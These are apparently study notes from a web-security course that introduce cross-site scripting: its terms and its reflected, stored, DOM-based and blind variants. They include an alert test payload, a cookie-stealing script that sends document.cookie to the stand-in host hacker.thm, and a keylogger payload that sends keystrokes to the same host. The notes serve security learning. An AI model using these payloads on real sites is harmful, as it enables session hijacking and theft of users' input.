# XSS INTRODUCTION

XSS (Cross-site scripting)

being used to steal sessions, deliver malware and escalate attacks withing the network.

## Important Terminalogies

Document Object Model (DOM) - browser's representation of the webpage, can be read and changed with JavaScript

URL Parameters - bits after `?` characters in a URL address that pass data to the site

JavaScript - is primary language in browser, xss payloads often are small JS code

Cookies - are used for storing data in the browser. `HttpOnly` flag is used to disallow js from reading cookies.

Escaping - transforming user input to the plain text. Used for bypassing input validation.

## XSS Payloads

XSS Payload is a JavaScript code that attacker injects to the web application that runs in other user's browser.

The browser may interpret the injection as the part of the website and run it without filtering.

What an attacker wants to do and modification of the payloads. INTENTION AND MODIFICATION two parts of xss paylaod.

### Testing for XSS

Firstly attacker should check if the webapp is vulnerable:

`<script>alert('XSS')</script>`

Simple xss payload. Pop up message with 'XSS' string.

### Where Payloads Are Injected

Typically injected into areas of user input and display's it.

### Example of XSS intentions

#### Proof of Concept:

`<script>alert('XSS')</script>`

#### Session Stealing:

Sends target's cookies to the server controlled by an attacker

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

btoa() -> encodes cookie.

#### Key Logger:

Capturing sensitive data

<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>

#### Business Logic Attack:

Payloads that capturing and abusing some function withing the web app.

For example if there is a function for changing the email address the attacker could change the target's address to his own.

### Relfected XSS - Non Persistant

Reflected XSS is type of an XSS injection.

This attack is used in webapps that do not use sanitazation from queries.

The attacker creates malicious script and convinces the user to click it.

This attack could steal session token, modify data or make actions on behalf of the user.

### Stored XSS - Persistant

This attack is saved in the database and attack is produced to whole users browser.

Stored XSS usually more dangerous than reflected because it affects whole bunch of users or amdins over time.

This attack is injected in comment sections, profile bio, message, admin-only panel view.

Could steal sessions token and take actions behalf of the victim's account.

### DOM Based XSS

Happens when client-side js reads code from untrusted source. Happens only in user's browser, never reaching the server.

Using the `innerHTML' the browser could automatically paste into the browser the untrusted code.

Input will not reach the server side, so it will not prevent from runnint the malicious script.

### Blind XSS

Blind XSS is similar to the stored xss injection but in this attack you cannot see or test the payload.

Contact Form -> input payload -> transforms into supporting tickets -> staff views in private portal.

By using callbacks to the server an attacker could see the url address of the private portal url,
the staff's member cookies and web pages content being viewed.
